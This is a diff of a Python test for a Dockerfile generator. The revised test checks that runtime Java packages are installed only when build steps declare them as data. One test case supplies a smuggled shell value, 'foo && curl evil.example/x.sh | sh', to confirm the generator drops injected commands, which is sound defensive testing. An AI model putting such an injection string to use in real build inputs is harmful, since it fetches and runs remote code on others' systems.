@@ -4542,20 +4542,51 @@ def test_mcp_freeze_repoint_drives_container_native_builder(monkeypatch, tmp_pat
 # ---------------------------------------------------------------------------
 
 def test_container_native_multistage_runtime_provisions_jar_jre():
-    """Phase D: a jar tool's wrapper needs java at RUNTIME — the runtime stage adds a
-    JRE only when a jar step is present (non-jar images stay lean)."""
+    """Phase D: a tool's wrapper may need an interpreter at RUNTIME. The runtime stage
+    adds exactly the packages the recorded steps DECLARE in `runtime_packages` (lean
+    images stay lean).
+
+    This test used to assert the prose rule (`purpose.endswith("(java jar)")`) and so
+    pinned the defect by construction: its step dict carried only {command, purpose}.
+    Under that rule ONLY the jar tier could earn a JRE, while a java tool arriving via
+    synthesized / script_repo / release_binary — an snpEff or Trimmomatic zip is
+    precisely that shape — installed its JRE into the builder and then shipped a
+    runtime image with no /usr/bin/java. Cases (b) and (c) below are the two halves
+    that keep the string rule from creeping back."""
     from agent.skills.container_build import emit_dockerfile, PixiEngine
-    jar_step = [{"command": "set -eux; curl -o /opt/tools/picard/picard.jar x; ...",
-                 "purpose": "picard (java jar)"}]
-    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=False,
-                         longtail_steps=jar_step)
-    runtime = df.split("# ---- runtime image (shipped) ----", 1)[1]
-    assert "default-jre-headless" in runtime          # JRE shipped for the jar wrapper
-    # a non-jar image does NOT carry a JRE
-    bin_step = [{"command": "install -m0755 /tmp/x /usr/local/bin/x", "purpose": "x (release binary)"}]
-    df2 = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=False,
-                          longtail_steps=bin_step)
-    assert "default-jre-headless" not in df2
+
+    def _runtime(steps):
+        df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(),
+                             has_env_layer=False, longtail_steps=steps)
+        return df.split("# ---- runtime image (shipped) ----", 1)[1]
+
+    # (a) a jar step DECLARES the JRE and gets it
+    assert "default-jre-headless" in _runtime(
+        [{"command": "set -eux; curl -o /opt/tools/picard/picard.jar x; ...",
+          "purpose": "picard (java jar)", "runtime_packages": ["default-jre-headless"]}])
+
+    # (b) THE FAILURE THAT SHIPPED: a java tool from a NON-jar tier also gets it,
+    #     because the need is declared as data rather than sniffed out of prose.
+    assert "default-jre-headless" in _runtime(
+        [{"command": "set -eux; unzip snpEff.zip ...",
+          "purpose": "snpEff (synthesized @ abc123)",
+          "runtime_packages": ["default-jre-headless"]}])
+
+    # (c) …and a step whose PROSE says "(java jar)" but declares nothing does NOT —
+    #     otherwise the deleted string rule is still live under another name.
+    assert "default-jre-headless" not in _runtime(
+        [{"command": "true", "purpose": "impostor (java jar)"}])
+
+    # (d) a lean image stays lean
+    assert "default-jre-headless" not in _runtime(
+        [{"command": "install -m0755 /tmp/x /usr/local/bin/x", "purpose": "x (release binary)",
+          "runtime_packages": []}])
+
+    # (e) the runtime apt line is bare-interpolated into a Dockerfile RUN, so a
+    #     non-package token is DROPPED rather than escaped-and-executed.
+    injected = _runtime([{"command": "true", "purpose": "p",
+                          "runtime_packages": ["foo && curl evil.example/x.sh | sh"]}])
+    assert "curl evil.example" not in injected
 
 
 def test_mcp_freeze_pure_conda_builds_container_native_no_condapack(monkeypatch, tmp_path):
